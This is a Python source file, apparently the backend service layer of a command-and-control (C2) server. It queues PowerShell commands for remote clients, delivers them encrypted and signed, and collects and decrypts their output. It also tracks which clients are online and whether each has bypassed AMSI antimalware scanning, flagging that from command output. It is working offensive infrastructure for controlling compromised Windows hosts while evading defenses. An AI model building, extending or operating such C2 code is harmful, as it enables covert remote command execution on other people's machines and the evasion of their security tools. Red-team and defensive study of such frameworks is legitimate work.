"""
MCP Service Layer for FastAPI Backend
======================================

This module uses the MCP SDK to provide efficient, type-safe service functions
that can be used by both the FastAPI routes AND the standalone MCP server.

This eliminates code duplication and provides a single source of truth for
C2 operations.
"""

from __future__ import annotations
import logging
from typing import Optional, List, Dict, Any
from datetime import datetime, timezone, timedelta
from sqlalchemy.orm import Session
from sqlalchemy import select, func, case
import uuid

from .models import Instruction, ClientSeen, User
from .crypto_runtime import RING, encrypt_cbc_b64, hmac_sha256_b64
from .amsi_status_tracker import amsi_tracker
from Crypto.Cipher import AES

log = logging.getLogger(__name__)


# ==============================================================================
# MCP-Style Service Functions (Type-Safe, Documented)
# ==============================================================================

def now_utc() -> datetime:
    """Get current UTC datetime"""
    return datetime.now(timezone.utc)


async def list_clients_service(
    db: Session,
    window_seconds: int = 120
) -> Dict[str, Any]:
    """List all clients with connection status and statistics

    This function uses MCP-style documentation and type hints to provide
    a clear, maintainable interface.

    Args:
        db: Database session
        window_seconds: Time window for considering clients "connected"

    Returns:
        Dictionary with clients list and metadata
    """
    cutoff = now_utc() - timedelta(seconds=window_seconds)

    # 1) Get last seen timestamps
    seen_rows = db.execute(
        select(ClientSeen.client_id, ClientSeen.last_seen_at)
    ).all()
    last_seen = {cid: lsa for cid, lsa in seen_rows}

    # 2) Get all client IDs from instructions (historical)
    instr_ids = db.execute(
        select(Instruction.client_id).distinct()
    ).scalars().all()

    # 3) Union of all known clients
    all_ids = sorted(set(last_seen.keys()) | set(instr_ids))

    # 4) Get instruction counts per client
    counts_rows = db.execute(
        select(
            Instruction.client_id,
            func.sum(case((Instruction.status == "queued", 1), else_=0)).label("queued"),
            func.sum(case((Instruction.status == "delivered", 1), else_=0)).label("delivered"),
            func.sum(case((Instruction.status == "completed", 1), else_=0)).label("completed"),
            func.count().label("total"),
        ).group_by(Instruction.client_id)
    ).all()

    counts = {
        cid: {
            "queued": int(q or 0),
            "delivered": int(d or 0),
            "completed": int(c or 0),
            "total": int(t or 0)
        }
        for cid, q, d, c, t in counts_rows
    }

    # 5) Build client list
    clients = []
    for cid in all_ids:
        client_counts = counts.get(cid, {"queued": 0, "delivered": 0, "completed": 0, "total": 0})
        lsa = last_seen.get(cid)
        connected = bool(lsa and lsa >= cutoff)

        # Get AMSI bypass status (session-based)
        amsi_status = amsi_tracker.get_status(cid)

        clients.append({
            "id": cid,
            "connected": connected,
            "last_seen_at": lsa.isoformat() if lsa else None,
            # snake_case for Python/API
            "queued": client_counts["queued"],
            "delivered": client_counts["delivered"],
            "completed": client_counts["completed"],
            "total": client_counts["total"],
            "amsi_bypassed": amsi_status.get("bypassed", False),
            # camelCase for JavaScript/UI compatibility
            "lastSeenAt": lsa.isoformat() if lsa else None,
            "queuedCount": client_counts["queued"],
            "deliveredCount": client_counts["delivered"],
            "completedCount": client_counts["completed"],
            "totalCount": client_counts["total"],
            "amsiBypassed": amsi_status.get("bypassed", False),
        })

    # Sort: connected first, then by ID
    clients.sort(key=lambda r: (not r["connected"], r["id"]))

    log.info(
        "[mcp_service] Listed %d clients, %d connected (window=%ds)",
        len(clients),
        sum(1 for c in clients if c["connected"]),
        window_seconds
    )

    return {"clients": clients}


async def create_instruction_service(
    db: Session,
    client_id: str,
    command: str,
    user: Optional[User] = None
) -> Dict[str, Any]:
    """Create a new instruction in the queue

    Args:
        db: Database session
        client_id: Target client identifier
        command: PowerShell command to execute
        user: Optional user who created the instruction

    Returns:
        Dictionary with instruction details
    """
    instruction = Instruction(
        client_id=client_id,
        command_plain=command,
        status="queued",
        created_at=now_utc()
    )

    db.add(instruction)
    db.commit()
    db.refresh(instruction)

    log.info(
        "[mcp_service] Created instruction %s for client %s (user=%s)",
        instruction.id,
        client_id,
        user.username if user else "unknown"
    )

    return {
        "id": str(instruction.id),
        "instruction_id": str(instruction.id),  # Alias for compatibility
        "client_id": client_id,
        "command": command,
        "status": "queued",
        "created_at": instruction.created_at.isoformat(),
        "success": True,
        "message": f"Command queued for execution on {client_id}"
    }


async def get_instruction_for_client_service(
    db: Session,
    client_id: str
) -> Optional[Dict[str, Any]]:
    """Get next queued instruction for a client and mark it as delivered

    Args:
        db: Database session
        client_id: Client requesting instruction

    Returns:
        Encrypted instruction or None if queue is empty
    """
    # Update heartbeat
    t = now_utc()
    seen = db.get(ClientSeen, client_id)
    if seen:
        seen.last_seen_at = t
    else:
        db.add(ClientSeen(client_id=client_id, last_seen_at=t))
    db.commit()

    # Get next queued instruction
    row = db.execute(
        select(Instruction)
        .where(Instruction.client_id == client_id, Instruction.status == "queued")
        .order_by(Instruction.created_at.asc())
        .limit(1)
    ).scalar_one_or_none()

    if not row:
        return None

    # Get encryption keys from runtime ring
    got = RING.get_all(client_id)
    if not got:
        log.error("[mcp_service] No session keys for client %s", client_id)
        raise ValueError(f"No session keys for client {client_id}")

    kid, enc_key, mac_key = got

    # Encrypt and sign command
    plain_bytes = row.command_plain.encode("utf-8")
    enc_b64 = encrypt_cbc_b64(enc_key, plain_bytes)
    sig_b64 = hmac_sha256_b64(mac_key, plain_bytes)

    # Mark as delivered
    row.status = "delivered"
    row.delivered_at = t
    db.commit()

    log.info("[mcp_service] Delivered instruction %s to client %s", row.id, client_id)

    return {
        "id": str(row.id),
        "client_id": row.client_id,
        "encryptedCommand": enc_b64,
        "kid": kid,
        "sig": sig_b64,
        "ts": int(t.timestamp()),
    }


async def store_result_service(
    db: Session,
    instruction_id: str,
    client_id: str,
    encrypted_result: bytes
) -> Dict[str, Any]:
    """Store encrypted result and mark instruction as completed

    Args:
        db: Database session
        instruction_id: Instruction UUID
        client_id: Client submitting result
        encrypted_result: Raw encrypted bytes (IV + ciphertext)

    Returns:
        Success confirmation
    """
    try:
        uid = uuid.UUID(str(instruction_id))
    except Exception as e:
        raise ValueError(f"Invalid UUID format: {e}")

    # Verify instruction exists and belongs to client
    existing = db.execute(
        select(Instruction).where(
            Instruction.id == uid,
            Instruction.client_id == client_id
        )
    ).scalar_one_or_none()

    if not existing:
        raise ValueError(f"Instruction {instruction_id} not found for client {client_id}")

    # Update instruction with result
    t = now_utc()
    existing.result_cipher = encrypted_result
    existing.status = "completed"
    existing.completed_at = t
    db.commit()

    log.info("[mcp_service] Stored result for instruction %s from client %s", instruction_id, client_id)

    return {
        "ok": True,
        "success": True,
        "instruction_id": instruction_id,
        "client_id": client_id
    }


async def get_result_service(
    db: Session,
    instruction_id: str,
    decrypt: bool = False
) -> Dict[str, Any]:
    """Get instruction result, optionally decrypted

    Args:
        db: Database session
        instruction_id: Instruction UUID
        decrypt: Whether to decrypt the result

    Returns:
        Result data with optional plaintext
    """
    try:
        rid_uuid = uuid.UUID(str(instruction_id))
    except Exception:
        raise ValueError("Invalid instruction ID format")

    # Fetch instruction
    row = db.get(Instruction, rid_uuid)
    if not row:
        # Fallback for UUID casting issues
        from sqlalchemy import String, cast
        row = db.execute(
            select(Instruction).where(cast(Instruction.id, String) == str(rid_uuid))
        ).scalar_one_or_none()

    if not row:
        raise ValueError(f"Instruction {instruction_id} not found")

    # Base response
    cipher_bytes = row.result_cipher if row.result_cipher else None
    response = {
        "id": str(row.id),
        "client_id": row.client_id,
        "status": row.status,
        "created_at": row.created_at.isoformat() if row.created_at else None,
        "delivered_at": row.delivered_at.isoformat() if row.delivered_at else None,
        "completed_at": row.completed_at.isoformat() if row.completed_at else None,
        "command_plain": row.command_plain,
        "result_cipher_b64": None,
        "plaintext": None,
    }

    if cipher_bytes:
        import base64
        response["result_cipher_b64"] = base64.b64encode(cipher_bytes).decode("ascii")

    # Decrypt if requested and possible
    if decrypt and cipher_bytes:
        got = RING.get_enc(row.client_id)
        if not got:
            response["plaintext"] = "Key not available in memory; cannot decrypt"
            response["note"] = "Key not available"
            return response

        kid, enc_key = got

        # AES-256-CBC: IV(16) || ciphertext
        if len(cipher_bytes) < 17:
            response["plaintext"] = "Ciphertext too short"
            response["note"] = "Invalid ciphertext"
            return response

        try:
            iv = cipher_bytes[:16]
            ct = cipher_bytes[16:]

            cipher = AES.new(enc_key, AES.MODE_CBC, iv=iv)
            pt = cipher.decrypt(ct)

            # PKCS#7 unpad
            if not pt:
                raise ValueError("Empty plaintext after decrypt")
            pad_len = pt[-1]
            if pad_len < 1 or pad_len > 16 or any(b != pad_len for b in pt[-pad_len:]):
                raise ValueError("Invalid PKCS#7 padding")
            pt = pt[:-pad_len]

            decrypted_text = pt.decode('utf-8')
            response["plaintext"] = decrypted_text
            response["result_plain_b64"] = base64.b64encode(pt).decode("ascii")
            response["kid"] = kid

            # Auto-detect AMSI bypass from output
            if amsi_tracker.detect_from_output(decrypted_text):
                amsi_tracker.mark_bypassed(row.client_id, str(row.id))
                log.info("[mcp_service] AMSI bypass detected for client %s", row.client_id)

            log.info("[mcp_service] Decrypted result for instruction %s", instruction_id)

        except Exception as e:
            log.error("[mcp_service] Decrypt failed for %s: %s", instruction_id, e)
            response["plaintext"] = f"Decrypt failed: {e}"
            response["note"] = f"Decrypt error: {e}"

    return response


async def list_queue_service(
    db: Session,
    client_id: Optional[str] = None,
    status: Optional[str] = None,
    limit: int = 200
) -> List[Dict[str, Any]]:
    """List instructions in the queue with optional filters

    Args:
        db: Database session
        client_id: Optional client filter
        status: Optional status filter (queued, delivered, completed)
        limit: Maximum results to return

    Returns:
        List of instruction dictionaries
    """
    has_result_cond = Instruction.result_cipher.isnot(None)

    stmt = select(
        Instruction.id,
        Instruction.client_id,
        Instruction.command_plain,
        Instruction.status,
        Instruction.created_at,
        Instruction.delivered_at,
        Instruction.completed_at,
        case((has_result_cond, True), else_=False).label("has_result"),
    ).order_by(Instruction.created_at.desc()).limit(limit)

    if client_id:
        stmt = stmt.where(Instruction.client_id == client_id)
    if status:
        stmt = stmt.where(Instruction.status == status)

    rows = db.execute(stmt).mappings().all()

    log.info(
        "[mcp_service] Listed queue: %d instructions (client=%s, status=%s)",
        len(rows),
        client_id or "all",
        status or "all"
    )

    return [
        {
            "id": str(r["id"]),
            "client_id": r["client_id"],
            "command_plain": r["command_plain"],
            "status": r["status"],
            "created_at": r["created_at"].isoformat() if r["created_at"] else None,
            "delivered_at": r["delivered_at"].isoformat() if r["delivered_at"] else None,
            "completed_at": r["completed_at"].isoformat() if r["completed_at"] else None,
            "has_result": bool(r["has_result"]),
        }
        for r in rows
    ]


async def update_heartbeat_service(
    db: Session,
    client_id: str
) -> Dict[str, Any]:
    """Update client heartbeat timestamp

    Args:
        db: Database session
        client_id: Client identifier

    Returns:
        Success confirmation
    """
    t = now_utc()
    row = db.get(ClientSeen, client_id)

    if row:
        row.last_seen_at = t
        log.debug("[mcp_service] Updated heartbeat for %s", client_id)
    else:
        db.add(ClientSeen(client_id=client_id, last_seen_at=t))
        log.info("[mcp_service] Created new client %s", client_id)

    db.commit()

    return {
        "ok": True,
        "client_id": client_id,
        "timestamp": t.isoformat()
    }


async def get_client_details_service(
    db: Session,
    client_id: str,
    window_seconds: int = 120
) -> Dict[str, Any]:
    """Get detailed information about a specific client

    Args:
        db: Database session
        client_id: Client identifier
        window_seconds: Time window for "online" status

    Returns:
        Detailed client information with statistics
    """
    cutoff = now_utc() - timedelta(seconds=window_seconds)

    # Get last seen timestamp
    seen_row = db.get(ClientSeen, client_id)
    last_seen_at = seen_row.last_seen_at if seen_row else None
    connected = bool(last_seen_at and last_seen_at >= cutoff)

    # Get instruction counts
    counts = db.execute(
        select(
            func.sum(case((Instruction.status == "queued", 1), else_=0)).label("queued"),
            func.sum(case((Instruction.status == "delivered", 1), else_=0)).label("delivered"),
            func.sum(case((Instruction.status == "completed", 1), else_=0)).label("completed"),
            func.count().label("total"),
        ).where(Instruction.client_id == client_id)
    ).first()

    queued = int(counts.queued or 0) if counts else 0
    delivered = int(counts.delivered or 0) if counts else 0
    completed = int(counts.completed or 0) if counts else 0
    total = int(counts.total or 0) if counts else 0

    # Get recent instructions (last 10)
    recent_instructions = db.execute(
        select(Instruction)
        .where(Instruction.client_id == client_id)
        .order_by(Instruction.created_at.desc())
        .limit(10)
    ).scalars().all()

    recent_list = []
    for instr in recent_instructions:
        recent_list.append({
            "id": str(instr.id),
            "status": instr.status,
            "command_preview": instr.command_plain[:100] if instr.command_plain else None,
            "created_at": instr.created_at.isoformat() if instr.created_at else None,
            "completed_at": instr.completed_at.isoformat() if instr.completed_at else None,
        })

    return {
        "client_id": client_id,
        "connected": connected,
        "last_seen_at": last_seen_at.isoformat() if last_seen_at else None,
        "statistics": {
            "queued": queued,
            "delivered": delivered,
            "completed": completed,
            "total": total
        },
        "recent_instructions": recent_list
    }


async def delete_instruction_service(
    db: Session,
    instruction_id: str,
    user: User
) -> Dict[str, Any]:
    """Delete a queued instruction (before delivery)

    Args:
        db: Database session
        instruction_id: Instruction ID to delete
        user: User performing the deletion

    Returns:
        Deletion confirmation

    Raises:
        ValueError: If instruction not found or already delivered
    """
    try:
        instr_uuid = uuid.UUID(instruction_id)
    except (ValueError, AttributeError):
        raise ValueError(f"Invalid instruction ID format: {instruction_id}")

    instruction = db.get(Instruction, instr_uuid)

    if not instruction:
        raise ValueError(f"Instruction not found: {instruction_id}")

    # Only allow deletion of queued instructions
    if instruction.status != "queued":
        raise ValueError(
            f"Cannot delete instruction in status '{instruction.status}'. "
            f"Only 'queued' instructions can be deleted."
        )

    log.info(
        f"[mcp_service] User {user.username} deleting instruction {instruction_id} "
        f"for client {instruction.client_id}"
    )

    db.delete(instruction)
    db.commit()

    return {
        "success": True,
        "message": f"Instruction {instruction_id} deleted successfully",
        "instruction_id": instruction_id,
        "client_id": instruction.client_id,
        "deleted_by": user.username,
        "deleted_at": now_utc().isoformat()
    }


# ==============================================================================
# Utility Functions
# ==============================================================================

def validate_client_id(client_id: str) -> str:
    """Validate and normalize client ID

    Args:
        client_id: Raw client ID

    Returns:
        Normalized client ID

    Raises:
        ValueError: If client ID is invalid
    """
    if not client_id or not client_id.strip():
        raise ValueError("Client ID cannot be empty")

    normalized = client_id.strip()

    # Basic validation
    if len(normalized) > 255:
        raise ValueError("Client ID too long (max 255 characters)")

    return normalized


def validate_command(command: str) -> str:
    """Validate PowerShell command

    Args:
        command: Raw PowerShell command

    Returns:
        Validated command

    Raises:
        ValueError: If command is invalid
    """
    if not command or not command.strip():
        raise ValueError("Command cannot be empty")

    # Could add more validation here if needed
    return command.strip()
